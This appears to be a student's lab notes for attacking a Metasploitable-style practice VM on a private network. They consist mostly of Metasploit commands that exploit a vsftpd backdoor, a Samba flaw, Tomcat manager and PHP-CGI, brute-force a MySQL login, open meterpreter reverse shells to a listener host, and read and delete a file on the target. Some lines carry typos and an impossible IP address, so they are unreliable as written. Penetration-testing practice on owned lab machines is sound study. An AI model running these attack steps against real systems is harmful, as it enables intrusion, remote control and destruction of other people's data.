ip a
sudo apt-get install nikto (If nikto is not installed - convert to NAT)
nikto -h http://192.168.56.101/multillidae/

nmap -sS -sV 192.168.56.101
--------> VSFTPD Backdoor Command Execution
msfconsole -q
  search vsftpd
  use exploit/unix/ftp/vsftpd_234_backdoor
  info
  show options
  set RHOST 192.168.56.101
  exploit
          <We should get found shell as output in the terminal>
          <Now we have root access of meta machine>
          <Now we have to go to meta>
  cd home
  ls
  cd msfadmin
  ls
  cat file_name.txt
  rm file_name.txt

--------> Samba username map script command Execution
msfconsole -q 
  search samba
  use exploit/multi/samba/usermap_script
  show options
  set RHOST 192.168.56.101
  exploit

msfconsole -q 
  search samba
  use auxiliry/admin/smb/samba_symlink_trasversal
  show options
  set RHOST 192.168.56.101
  exploit
  exit
  smbclient -L//192.168.56.101/tmp

--------> MySQL Login Utility
msfconsole -q
  search mysql
  use auxiliary/scanner/mysql/mysql_login
  show options
  set BLANK_PASSWORDS true
  set PASS_FILE/root/Desktop/username.txt     <password.txt>
  set USER_FILE/root/Desktop/username.txt
  set RHOST 192.168.56.101
  exploit
  mysql -h 192.168.565.101 -u root -p

-------->  Tomcat 
msfconsole -q
  search tomcat
  use exploit/multi/http/tomcat_mgr_deploy
  set PAYLOAD java/meterpreter/reverse_tcp
  show options
  set RHOST 192.168.56.101
  set LHOST 192.168.56.102
  set USERNAME tomcat
  set PASSWORD tomcat
  set target 0
  set RPORT 8180
  exploit

--------> Apache (CGI Argument  Injection)
msfconsole -q
  search php
  use exploit/multi/http/php_cgi_arg_injection
  set PAYLOAD php/meterpreter/reverse_tcp
  show options
  set RHOST 192.168.56.101
  set LHOST 192.168.56.102
  run
  getuid
